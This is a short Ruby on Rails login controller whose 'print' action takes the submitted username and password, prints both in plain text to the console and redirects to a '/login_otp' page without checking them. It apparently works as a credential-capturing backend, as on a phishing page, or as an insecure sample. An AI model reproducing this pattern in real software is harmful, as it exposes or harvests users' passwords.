class LoginController < ApplicationController
  def view
    
  end

  def print
    @username = params['username']
    @password = params['password']
    puts("Attempted login with username: " + @username + " and password: " + @password)
    redirect_to '/login_otp'
  end
end
